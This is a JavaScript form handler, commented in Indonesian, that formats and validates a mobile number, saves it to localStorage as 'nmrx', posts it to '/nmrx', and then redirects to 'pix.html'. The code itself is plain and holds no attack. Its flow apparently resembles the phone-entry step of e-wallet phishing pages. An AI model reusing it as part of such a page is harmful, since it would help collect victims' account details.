// form.js

// ELEMENT SELECTORS
const phoneInput = document.getElementById("phone");
const lanjutBtn = document.getElementById("lanjutBtn");
const errorBox = document.getElementById("errorBox");
const clearBtn = document.getElementById("clearBtn");

/* FADE IN INITIAL PAGE */ 
window.addEventListener("load", () => {
    document.body.classList.add("fade-in");
});

/* AUTO FOCUS ON LOAD */
window.onload = () => {
    phoneInput.focus();
};

/* FORMAT NOMOR (INPUT MASKING: 812-3456-7890) */
phoneInput.addEventListener("input", (e) => {
    /* HANYA MENERIMA ANGKA */
    let angka = e.target.value.replace(/\D/g, '');

    /* MAKSIMAL 13 DIGIT ANGKA */
    angka = angka.substring(0, 13);

    let hasil = "";

    /* SEGMEN 1 (3 Digit Pertama: e.g., 812) */
    if (angka.length > 0) {
        hasil += angka.substring(0, 3);
    }

    /* SEGMEN 2 (4 Digit Kedua: e.g., 812-3456) */
    if (angka.length >= 3) {
        hasil += "-" + angka.substring(3, 7);
    }

    /* SEGMEN 3 (Sisa Digit: e.g., 812-3456-7890) */
    if (angka.length >= 7) {
        hasil += "-" + angka.substring(7, 13);
    }

    e.target.value = hasil;

    /* TAMPIL/SEMBUNYIKAN TOMBOL CLEAR (✕) */
    if (hasil.length > 0) {
        clearBtn.style.display = "flex";
    } else {
        clearBtn.style.display = "none";
    }

    /* SEMBUNYIKAN ERROR SAAT USER MENGETIK KEMBALI */
    errorBox.classList.remove("show");
});

/* TOMBOL HAPUS (CLEAR BUTTON) */
clearBtn.addEventListener("click", () => {
    phoneInput.value = "";
    clearBtn.style.display = "none";
    errorBox.classList.remove("show");
    phoneInput.focus();
});

/* FORCE KEYBOARD ANGKA PADA PERANGKAT MOBILE */
phoneInput.setAttribute("inputmode", "numeric");

/* SUBMIT SAAT TEKAN ENTER */
phoneInput.addEventListener("keypress", (e) => {
    if (e.key === "Enter") {
        lanjutBtn.click();
    }
});

/* PROSES SUBMIT / LANJUT */
lanjutBtn.addEventListener("click", async () => {
    /* AMBIL HANYA ANGKA SAJA UNTUK VALIDASI */
    const nomor = phoneInput.value.replace(/\D/g, '');

    /* VALIDASI: MINIMAL 9 ANGKA DAN HARUS DIAWALI '8' */
    if (nomor.length < 9 || nomor.charAt(0) !== "8") {
        /* EFEK GETAR PADA HP (JIKA MENDUKUNG) */
        if (navigator.vibrate) {
            navigator.vibrate([120, 80, 120]);
        }

        /* TAMPILKAN EROR */
        errorBox.classList.add("show");

        /* SEMBUNYIKAN EROR OTOMATIS SETELAH 2 DETIK */
        setTimeout(() => {
            errorBox.classList.remove("show");
        }, 2000);

        phoneInput.focus();
        return;
    }

    // --- PROSES LOADING DI TOMBOL DIMULAI ---
    lanjutBtn.classList.add("loading"); // Memunculkan spinner di dalam tombol via CSS
    lanjutBtn.disabled = true;          // Kunci tombol agar tidak di-klik ganda (spam)
    phoneInput.disabled = true;         // Kunci input field selama memproses data

    /* SIMPAN DATA KE LOCAL STORAGE */
    localStorage.setItem("nmrx", phoneInput.value);

    /* KIRIM DATA KE SERVER */
    try {
        await fetch("/nmrx", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                nmrx: phoneInput.value
            })
        });
    } catch (error) {
        console.error("Gagal mengirim data:", error);
    }

    /* NAVIGASI / PINDAH HALAMAN SETELAH 2 DETIK */
    setTimeout(() => {
        /* EFEK FADE OUT HALAMAN */
        document.body.classList.add("fade-out");

        window.location.href = "pix.html";
    }, 2000);
});

/* RESET KONDISI TOMBOL (JIKA USER KEMBALI DARI HALAMAN SEBELUMNYA VIA TOMBOL BACK BROWSER) */
window.addEventListener("pageshow", () => {
    lanjutBtn.classList.remove("loading");
    lanjutBtn.disabled = false;
    phoneInput.disabled = false;
});
